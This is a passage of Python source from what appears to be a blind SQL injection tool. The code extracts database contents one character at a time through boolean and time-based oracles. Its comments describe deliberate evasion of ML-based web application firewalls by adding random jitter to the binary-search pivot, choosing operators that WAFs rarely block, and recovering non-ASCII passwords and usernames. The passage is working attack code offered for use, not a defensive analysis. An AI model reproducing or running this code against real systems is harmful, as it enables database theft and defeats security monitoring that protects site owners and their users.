            # BUG-V163-BSEARCH-RANDOMIZE-BECI FIX (MEDIUM, all 5 DBMSes;
            # _blind_extract_char_inner; B/BH/IN/T/TH/HQ techniques; all surfaces):
            # The binary search used a fixed pivot mid=(lo+hi)//2.  A perfectly predictable
            # binary search pattern — the probe sequence >=128, >=64, >=96, ... converges
            # identically for any given character value — is detectable by ML-based WAFs
            # (Cloudflare Enterprise, Akamai Bot Manager, PerimeterX) that correlate the
            # boolean oracle response pattern (T/F/T/F/T) with the fixed pivot sequence.
            # After observing 3-5 extraction characters' worth of probes, such WAFs build
            # a "binary-search oracle" detection model and block subsequent probes.
            # Fix: use _randomized_mid(lo, hi) (TECHNIQUE-3) which adds bounded jitter to
            # the pivot: up to ±(span//8) so the convergence path varies per-probe while
            # still converging in O(log N) iterations.  On narrow ranges (hi-lo <= 4),
            # _randomized_mid falls back to the exact midpoint (jitter is meaningless there).
            # Numeric safety: _randomized_mid only changes the integer pivot value used in
            # the comparison operand (>={mid+1}, BETWEEN mid+1 AND hi); it never touches
            # SQL string delimiters, function names, or the overall payload structure.
            mid=_randomized_mid(lo, hi)
            
            if gt_blocked:
                # BUG-UNICODE-HI FIX (Issue 7/10): Was hardcoded 255. Must use char_hi
                # (passed by caller as 65535 for MSSQL/SQLite UNICODE() function) so the
                # binary search correctly covers the full BMP range [0, 65535].
                # Without this fix every character with codepoint > 255 (non-ASCII
                # passwords, CJK usernames, accented characters) was silently capped,
                # making the binary search converge at 255 and return chr(255)='ÿ'
                # instead of the real character.
                # BUG-PG-DOUBLE-PAREN FIX (Req 10): char_func for PostgreSQL is
                # "COALESCE(ASCII(SUBSTR(({query}),{pos},1)),0)" — when query itself is
                # wrapped in outer parens by the caller (e.g. "(SELECT version())"), the
                # formatted char_func becomes "COALESCE(ASCII(SUBSTR(((SELECT version())),1,1)),0)"
                # with double inner parens. The BETWEEN/>= condition then adds another
                # outer layer: "(COALESCE(...))" causing PostgreSQL parser ambiguity
                # on some versions ("ERROR: syntax error at or near '('").
                # Fix: strip a single outer ( ) pair from char_func before building the
                # condition, only when char_func starts and ends with matching parens,
                # so the expression is never double-wrapped.
                _char_func_cond = char_func
                if (_char_func_cond and _char_func_cond.startswith('(')
                        and _char_func_cond.endswith(')')):
                    # Only strip if the outermost parens are truly wrapping the whole expr
                    # (i.e. not part of a function call like "COALESCE(...)")
                    _inner = _char_func_cond[1:-1]
                    if not any(kw in _inner[:20].upper()
                               for kw in ('COALESCE', 'CASE ', 'SELECT', 'ASCII', 'ORD', 'UNICODE')):
                        _char_func_cond = _inner
                cond=f"{_char_func_cond} BETWEEN {mid+1} AND {char_hi}"
            else:
                # Use >= mid+1 (equivalent to > mid)  WAFs rarely block >=
                # BUG-PG-DOUBLE-PAREN FIX: same paren-strip for the >= branch
                _char_func_cond = char_func
                if (_char_func_cond and _char_func_cond.startswith('(')
                        and _char_func_cond.endswith(')')):
                    _inner = _char_func_cond[1:-1]
                    if not any(kw in _inner[:20].upper()
                               for kw in ('COALESCE', 'CASE ', 'SELECT', 'ASCII', 'ORD', 'UNICODE')):
                        _char_func_cond = _inner
                cond=f"{_char_func_cond}>={mid+1}"
